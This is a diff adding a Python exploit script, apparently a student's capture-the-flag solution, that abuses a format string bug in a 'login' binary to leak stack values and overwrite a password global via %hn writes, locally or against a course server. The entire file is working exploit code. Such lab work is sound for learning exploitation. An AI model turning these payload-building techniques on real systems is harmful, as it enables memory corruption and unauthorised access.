@@ -1,0 +1,279 @@
+#!/usr/bin/env python3
+"""
+formatstring3 - Format String Exploit Demonstration
+
+Demonstrates: Stack leak + Memory write via format string (%5$x, %5$hn)
+Target: Modify global variable utk_password to unlock flag
+
+Key findings:
+- Vulnerability: printf(user_input) treats input as format string
+- Address disclosed: 0x80e6048 (printed by program)
+- Maximum writable within 128-byte limit: ~127 decimal
+- Target value 0xD0C0FFEE (3.5 billion) exceeds buffer capacity
+"""
+
+import struct
+import socket
+import subprocess
+import sys
+import re
+import argparse
+
+TARGET_ADDR = 0x80E6048  # Address of utk_password (disclosed by binary)
+TARGET_VALUE = 0xD0C0FFEE  # Required value for success
+LOCAL_CWD = "/home/jbenjam7/cs466/ctf/formatstring3"
+REMOTE_HOST = "moa6.eecs.utk.edu"
+REMOTE_PORT = 32130
+
+
+def _send_payload(payload, is_remote=False):
+    """Send raw payload bytes to local binary or remote service."""
+    if is_remote:
+        sock = socket.create_connection((REMOTE_HOST, REMOTE_PORT), timeout=5)
+        try:
+            sock.sendall(payload)
+            sock.shutdown(socket.SHUT_WR)
+            response = b""
+            sock.settimeout(2)
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+                except socket.timeout:
+                    break
+            return response.decode("latin1", errors="ignore")
+        finally:
+            sock.close()
+
+    result = subprocess.run(
+        ["./login"],
+        input=payload,
+        capture_output=True,
+        cwd=LOCAL_CWD,
+        timeout=5,
+    )
+    return result.stdout.decode("latin1", errors="ignore")
+
+
+def find_input_offset(is_remote=False, max_position=100):
+    """Find the positional index where attacker-controlled bytes start on the stack."""
+    probe = b"AAAABBBB."
+    probe += b".".join(f"%{i}$p".encode() for i in range(1, max_position + 1))
+    probe += b"\n"
+
+    print(f"[*] Finding input offset (searching 1..{max_position})...")
+    out = _send_payload(probe, is_remote=is_remote)
+    if not out:
+        return None
+
+    # Search textual output for 0x41414141 and 0x42424242 in positional dump order.
+    tokens = re.findall(r"0x[0-9a-fA-F]+", out)
+    pos_aaaa = None
+    pos_bbbb = None
+
+    for idx, tok in enumerate(tokens, start=1):
+        low = tok.lower()
+        if low.endswith("41414141") and pos_aaaa is None:
+            pos_aaaa = idx
+        if low.endswith("42424242") and pos_bbbb is None:
+            pos_bbbb = idx
+
+    if pos_aaaa is None:
+        print("[!] Could not find AAAA marker on stack")
+        return None
+
+    if pos_bbbb is None or pos_bbbb != pos_aaaa + 1:
+        print("[!] Found partial markers; expected BBBB immediately after AAAA")
+        print(f"[!] AAAA at position {pos_aaaa}, BBBB at {pos_bbbb}")
+        return None
+
+    print(f"[+] Input starts at stack argument %{pos_aaaa}$...")
+    return pos_aaaa
+
+
+def _build_two_halfword_payload(target_addr, target_value, base_offset):
+    """Build a compact two-%hn payload for a 32-bit target value."""
+    low = target_value & 0xFFFF
+    high = (target_value >> 16) & 0xFFFF
+
+    # Write the smaller halfword first to avoid wraparound complexity.
+    writes = [
+        (low, target_addr),
+        (high, target_addr + 2),
+    ]
+    writes.sort(key=lambda x: x[0])
+
+    prefix = b"".join(struct.pack("<I", addr) for _, addr in writes)
+    printed = len(prefix)  # Raw address bytes contribute to output count.
+    fmt_parts = []
+
+    for i, (want, _) in enumerate(writes):
+        delta = (want - printed) % 0x10000
+        if delta:
+            fmt_parts.append(f"%{delta}c")
+            printed = (printed + delta) % 0x10000
+        fmt_parts.append(f"%{base_offset + i}$hn")
+
+    fmt = "".join(fmt_parts).encode("ascii")
+    return prefix + fmt + b"\n"
+
+
+def exploit_full_value(target_addr, target_value, is_remote=False):
+    """Auto-find offset and write full 32-bit value with two %hn writes."""
+    offset = find_input_offset(is_remote=is_remote)
+    if offset is None:
+        return None
+
+    payload = _build_two_halfword_payload(target_addr, target_value, offset)
+    print(f"[*] Using base offset: %{offset}$")
+    print(f"[*] Target address: 0x{target_addr:08x}")
+    print(f"[*] Target value:   0x{target_value:08x}")
+    print(f"[*] Payload length: {len(payload)} bytes")
+    return _send_payload(payload, is_remote=is_remote)
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="formatstring3 exploit helper")
+    parser.add_argument(
+        "command",
+        nargs="?",
+        default="help",
+        choices=["find-offset", "exploit", "leak", "write", "test", "help"],
+        help="action to run",
+    )
+    parser.add_argument(
+        "addr", nargs="?", help="target address for exploit", default=None
+    )
+    parser.add_argument(
+        "value", nargs="?", help="target value for exploit/write", default=None
+    )
+    parser.add_argument("--remote", action="store_true", help="use remote target")
+    return parser.parse_args()
+
+
+def leak_stack_value(is_remote=False):
+    """Leak stack values using %5$x format specifier"""
+    payload = b"LEAK%5$x\n"
+
+    print(
+        "[*] Leaking from remote target..."
+        if is_remote
+        else "[*] Leaking from local binary..."
+    )
+    try:
+        return _send_payload(payload, is_remote=is_remote)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return None
+
+
+def write_value_to_memory(write_value, is_remote=False):
+    """Write value to memory using %5$hn (16-bit write)"""
+
+    # Check constraints
+    addr = struct.pack("<I", TARGET_ADDR)
+    pad_size = write_value - 4 - 5  # 4 for addr, 5 for "%5$hn"
+    payload_size = write_value + 1  # +1 for newline
+
+    if payload_size > 128:
+        print(f"[!] Value {write_value} exceeds 128-byte buffer limit")
+        return None
+
+    if pad_size < 0:
+        print(f"[!] Value {write_value} too small")
+        return None
+
+    payload = addr + (b"X" * pad_size) + b"%5$hn\n"
+
+    print(f"[*] Writing 0x{write_value:04x} ({write_value}) to 0x{TARGET_ADDR:x}")
+    print(f"[*] Payload size: {len(payload)} bytes")
+
+    print(
+        "[*] Sending to remote target..."
+        if is_remote
+        else "[*] Sending to local binary..."
+    )
+    try:
+        return _send_payload(payload, is_remote=is_remote)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return None
+
+
+def main():
+    args = parse_args()
+    is_remote = args.remote
+
+    if args.command == "find-offset":
+        print("\n=== AUTO FIND OFFSET ===\n")
+        find_input_offset(is_remote=is_remote)
+
+    elif args.command == "exploit":
+        addr = int(args.addr, 0) if args.addr else TARGET_ADDR
+        value = int(args.value, 0) if args.value else TARGET_VALUE
+        print("\n=== AUTO EXPLOIT (find offset + write 32-bit value) ===\n")
+        out = exploit_full_value(addr, value, is_remote=is_remote)
+        print(out)
+
+    elif args.command == "leak":
+        print("\n=== STEP 1: Information Leak ===\n")
+        output = leak_stack_value(is_remote=is_remote)
+        print(output)
+
+    elif args.command == "write":
+        test_value = int(args.value, 0) if args.value else 119
+        print(f"\n=== STEP 2: Memory Write (Value={test_value}) ===\n")
+        output = write_value_to_memory(test_value, is_remote=is_remote)
+        print(output)
+
+    elif args.command == "test":
+        print("\n=== FULL TEST ===\n")
+        print("[1/2] Leak:")
+        leak_out = leak_stack_value(is_remote=is_remote)
+        print(leak_out)
+
+        print("\n[2/2] Write (value=119):")
+        write_out = write_value_to_memory(119, is_remote=is_remote)
+        print(write_out)
+
+    else:
+        print(
+            """
+formatstring3 Exploit Usage:
+
+Commands:
+    find-offset             - Auto-detect where your input starts on the stack
+        exploit [ADDR] [VALUE] - Auto find offset, then write full 32-bit VALUE to ADDR
+        leak                   - Leak stack values using %5$x
+        write [VALUE]          - Write VALUE to memory using %5$hn
+        test                   - Run both leak and write
+
+Options:
+        --remote               - Execute against remote target (moa6.eecs.utk.edu:32130)
+
+Examples:
+    python3 exploit.py find-offset           # Detect stack offset locally
+    python3 exploit.py exploit               # Use default target addr/value
+    python3 exploit.py exploit 0x80e6048 0xD0C0FFEE --remote
+        python3 exploit.py leak                  # Local leak
+        python3 exploit.py leak --remote         # Remote leak
+        python3 exploit.py write 119             # Local write 0x77 to 0x80e6048
+        python3 exploit.py write 0x77 --remote   # Remote write 0x77
+        python3 exploit.py test --remote         # Full remote test
+
+Notes:
+  Target address: 0x80e6048 (utk_password global)
+  Target value:   0xD0C0FFEE (3503208430 - exceeds buffer)
+  Buffer limit:   128 bytes (fgets)
+  Max writable:   127 (due to buffer constraint)
+  
+  Working writes: 10-127
+  Example: write 119 changes 0x12341234 -> 0x12340077
+        """
+        )
+
+
+if __name__ == "__main__":
+    main()
